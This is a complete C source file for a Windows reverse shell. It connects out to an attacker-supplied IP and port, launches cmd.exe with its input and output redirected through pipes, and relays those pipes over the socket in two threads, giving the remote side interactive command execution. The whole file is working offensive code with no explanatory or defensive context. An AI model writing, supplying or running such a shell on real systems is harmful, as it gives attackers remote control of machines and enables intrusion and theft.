#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_IP "<IP>"
#define DEFAULT_PORT 8080

SOCKET connectAttacker(const char *ip, int port){
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0){
        int error = WSAGetLastError();
        printf("[-] CANT CONNECT TO ATTACKER. Error WSA: %d\n", error);
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

DWORD WINAPI ReadFromProcess(LPVOID lpParam) {
    struct {
        HANDLE hPipe;
        SOCKET sock;
    } *ctx = lpParam;

    char buffer[1024];
    DWORD bytesRead;

    while (ReadFile(ctx->hPipe, buffer, sizeof(buffer), &bytesRead, NULL)) {
        send(ctx->sock, buffer, bytesRead, 0);
    }

    return 0;
}

DWORD WINAPI WriteToProcess(LPVOID lpParam) {
    struct {
        HANDLE hPipe;
        SOCKET sock;
    } *ctx = lpParam;

    char buffer[1024];
    int bytesRecv;

    while ((bytesRecv = recv(ctx->sock, buffer, sizeof(buffer), 0)) > 0) {
        DWORD bytesWritten;
        WriteFile(ctx->hPipe, buffer, bytesRecv, &bytesWritten, NULL);
    }

    return 0;
    
}

void launchShell(SOCKET sock){

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdinRead, hStdinWrite;
    HANDLE hStdoutRead, hStdoutWrite;

    CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0);
    CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0);
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi;

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;

    TCHAR cmd[] = TEXT("cmd.exe");

    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] Error launching the cmd.exe: %lu\n", GetLastError());
        return;
    }

    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);

    struct {
        HANDLE hPipe;
        SOCKET sock;
    } ctx1 = { hStdoutRead, sock }, ctx2 = { hStdinWrite, sock };

    CreateThread(NULL, 0, ReadFromProcess, &ctx1, 0, NULL);
    CreateThread(NULL, 0, WriteToProcess, &ctx2, 0, NULL);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdinWrite);
    CloseHandle(hStdoutRead);
}

int main(int argc, char *argv[]){
    const char *ip = DEFAULT_IP;
    int port = DEFAULT_PORT;

    if (argc == 3) {
        ip = argv[1];
        port = atoi(argv[2]);
    }

    SOCKET sock = connectAttacker(ip, port);
    if (sock == INVALID_SOCKET) {
        printf("[-] CANT CONNECT TO ATTACKER.\n");
        return 1;
    }

    launchShell(sock);

    closesocket(sock);
    WSACleanup();
    return 0;
}
